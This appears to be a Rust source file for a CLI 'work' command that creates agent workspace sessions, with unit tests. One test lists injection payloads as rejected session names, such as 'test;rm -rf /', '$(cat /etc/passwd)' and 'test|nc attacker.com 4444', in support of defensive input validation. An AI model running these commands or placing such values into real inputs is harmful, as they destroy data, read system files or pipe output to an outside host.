//! Action functions for the work command handler (Tier 3).
//!
//! I/O operations that create/manage work sessions.

use scp_core::output::Output;
use scp_core::validation::domain::validate_session_name;
use scp_core::{Error, Result};

use super::data::{build_env_vars, generate_short_id, WorkMode, WorkOptions, WorkOutput};

/// Execute the work command with the given options.
///
/// # Errors
///
/// Returns an error if the session name fails validation.
pub fn run_work(options: &WorkOptions) -> Result<()> {
    validate_session_name(&options.name).map_err(|_| {
        Error::validation_error(format!("Invalid session name: '{}'", options.name))
    })?;

    match options.mode {
        WorkMode::DryRun => output_dry_run(options),
        WorkMode::Normal | WorkMode::Idempotent => execute_work(options),
    }
}

/// Build the agent ID: return None when `no_agent`, otherwise
/// use the provided ID or generate one.
fn resolve_agent_id(options: &WorkOptions) -> Result<Option<String>> {
    if options.no_agent {
        return Ok(None);
    }

    let agent_id = match &options.agent_id {
        Some(id) => Some(id.clone()),
        None => {
            let short_id = generate_short_id()
                .map_err(|e| Error::io_error(format!("Failed to generate agent ID: {e}")))?;
            Some(format!("agent-{short_id}"))
        }
    };

    Ok(agent_id)
}

/// Build a `WorkOutput` from the given options and resolved agent ID.
fn build_work_output(options: &WorkOptions, agent_id: Option<String>) -> Result<WorkOutput> {
    let workspace_path = format!(".scp/workspaces/{}", options.name);

    let env_vars = build_env_vars(
        &options.name,
        &workspace_path,
        agent_id.as_deref(),
        options.bead_id.as_deref(),
    );

    Ok(WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: matches!(options.mode, WorkMode::Normal),
        agent_id,
        bead_id: options.bead_id.clone(),
        env_vars,
        enter_command: format!("cd {workspace_path}"),
    })
}

/// Execute a normal or idempotent work command.
fn execute_work(options: &WorkOptions) -> Result<()> {
    let agent_id = resolve_agent_id(options)?;
    let output = build_work_output(options, agent_id)?;
    output_result(&output)
}

/// Output for dry run mode.
fn output_dry_run(options: &WorkOptions) -> Result<()> {
    let agent_id = resolve_agent_id(options)?;
    let workspace_path = format!(".scp/workspaces/{}", options.name);

    let env_vars = build_env_vars(&options.name, &workspace_path, None, None);

    let output = WorkOutput {
        name: options.name.clone(),
        workspace_path: workspace_path.clone(),
        created: false,
        agent_id,
        bead_id: options.bead_id.clone(),
        env_vars,
        enter_command: format!("cd {workspace_path}"),
    };

    print_dry_run_summary(options, &output)
}

/// Print the dry-run summary to stdout.
fn print_dry_run_summary(options: &WorkOptions, output: &WorkOutput) -> Result<()> {
    Output::info(&format!(
        "[DRY RUN] Would create session '{}'",
        output.name
    ));
    Output::info(&format!("  Workspace: {}", output.workspace_path));

    if let Some(ref bead) = options.bead_id {
        Output::info(&format!("  Bead: {bead}"));
    }

    Ok(())
}

/// Output the result to stdout.
fn output_result(output: &WorkOutput) -> Result<()> {
    let status = if output.created { "Created" } else { "Using existing" };
    Output::info(&format!("{status} session '{}'", output.name));
    Output::info(&format!("  Workspace: {}", output.workspace_path));

    if let Some(ref agent) = output.agent_id {
        Output::info(&format!("  Agent: {agent}"));
    }
    if let Some(ref bead) = output.bead_id {
        Output::info(&format!("  Bead: {bead}"));
    }

    Output::info("");
    Output::info("To enter workspace:");
    Output::info(&format!("  {}", output.enter_command));

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use scp_core::OutputFormat;

    fn test_options(name: &str) -> WorkOptions {
        WorkOptions {
            name: name.to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        }
    }

    #[test]
    fn run_work_valid_name() {
        let options = test_options("my-session");
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_dry_run() {
        let options = WorkOptions {
            name: "dry-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::DryRun,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_rejects_empty_name() {
        let options = WorkOptions {
            name: String::new(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_err());
    }

    #[test]
    fn run_work_rejects_shell_metacharacters() {
        let malicious_names = vec![
            "test;rm -rf /",
            "test$(cat /etc/passwd)",
            "test`whoami`",
            "test|nc attacker.com 4444",
            "../etc/passwd",
            "/etc/passwd",
            "test\0name",
        ];

        for name in malicious_names {
            let options = WorkOptions {
                name: name.to_string(),
                bead_id: None,
                agent_id: None,
                no_agent: false,
                mode: WorkMode::Normal,
                format: OutputFormat::Json,
            };
            assert!(
                run_work(&options).is_err(),
                "Should reject malicious name: {name}"
            );
        }
    }

    #[test]
    fn run_work_with_bead_id() {
        let options = WorkOptions {
            name: "bead-session".to_string(),
            bead_id: Some("scp-12345".to_string()),
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_no_agent() {
        let options = WorkOptions {
            name: "no-agent-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: true,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_with_explicit_agent_id() {
        let options = WorkOptions {
            name: "agent-session".to_string(),
            bead_id: None,
            agent_id: Some("agent-custom".to_string()),
            no_agent: false,
            mode: WorkMode::Normal,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }

    #[test]
    fn run_work_accepts_valid_names() {
        let valid_names = vec![
            "workspace",
            "my-workspace",
            "my_workspace",
            "workspace123",
            "MyWorkspace",
            "FeatureBranch-123",
        ];

        for name in valid_names {
            let options = test_options(name);
            assert!(
                run_work(&options).is_ok(),
                "Should accept valid name: {name}"
            );
        }
    }

    #[test]
    fn output_dry_run_succeeds() {
        let options = WorkOptions {
            name: "dry-test".to_string(),
            bead_id: Some("bead-1".to_string()),
            agent_id: None,
            no_agent: false,
            mode: WorkMode::DryRun,
            format: OutputFormat::Json,
        };
        assert!(output_dry_run(&options).is_ok());
    }

    #[test]
    fn run_work_idempotent_mode() {
        let options = WorkOptions {
            name: "idem-session".to_string(),
            bead_id: None,
            agent_id: None,
            no_agent: false,
            mode: WorkMode::Idempotent,
            format: OutputFormat::Json,
        };
        assert!(run_work(&options).is_ok());
    }
}
